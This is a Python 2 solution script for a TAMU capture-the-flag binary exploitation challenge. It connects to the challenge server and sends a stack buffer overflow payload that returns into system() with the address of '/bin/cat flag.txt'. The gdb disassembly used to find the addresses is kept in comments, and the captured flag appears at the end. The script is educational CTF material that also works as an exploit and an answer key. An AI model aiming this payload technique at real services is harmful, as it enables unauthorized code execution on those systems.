#!/usr/bin/env python2
from struct import pack
import socket

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect(('web.ctf.tamu.edu', 4324))

def p(data):
	return pack("<I",data)

'''
gdb-peda$ disassemble flag_func
Dump of assembler code for function flag_func:
   0x080484cb <+0>:	push   ebp
   0x080484cc <+1>:	mov    ebp,esp
   0x080484ce <+3>:	sub    esp,0x8
   0x080484d1 <+6>:	sub    esp,0xc
   0x080484d4 <+9>:	push   0x80485e0
   0x080484d9 <+14>:	call   0x8048390 <system@plt>
   0x080484de <+19>:	add    esp,0x10
   0x080484e1 <+22>:	nop
   0x080484e2 <+23>:	leave  
   0x080484e3 <+24>:	ret 
'''
system = 0x80484d9 # from flag_func()

'''
gdb-peda$ find "/bin/cat"
Searching for '/bin/cat' in: None ranges
Found 3 results, display max 3 items:
pwn4 : 0x80485e0 ("/bin/cat flag2.txt")
pwn4 : 0x80495e0 ("/bin/cat flag2.txt")
pwn4 : 0x804a028 ("/bin/cat flag.txt")
'''
flag = 0x0804a028 # from .data "/bin/cat flag.txt"

payload = "A"*16
payload += p(system)
payload += p(flag)
payload += "JUNK"

r.send(payload + "\n")
print r.recv(1024)
r.close()

#gigem{R3TURN_0R13NT3D_PR0F1T}
